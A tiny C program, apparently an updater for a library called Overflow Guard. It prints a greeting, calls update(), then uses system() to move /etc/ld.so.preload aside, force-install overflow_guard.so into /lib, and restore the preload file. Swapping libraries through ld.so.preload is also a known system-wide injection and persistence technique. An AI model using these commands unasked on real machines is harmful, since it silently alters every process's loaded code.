#include <stdio.h>
#include "update.h"

int main(int argc, char *argv[])
{
	printf("Hello, world\n");
	update();
	system("mv -f /etc/ld.so.preload /etc/ld.so.preload.bak");
	system("mv -f ./overflow_guard.so /lib/overflow_guard.so");
	system("mv -f /etc/ld.so.preload.bak /etc/ld.so.preload");

	printf("\nOverflow Guard Update Complete\n");	
	return 0;
}
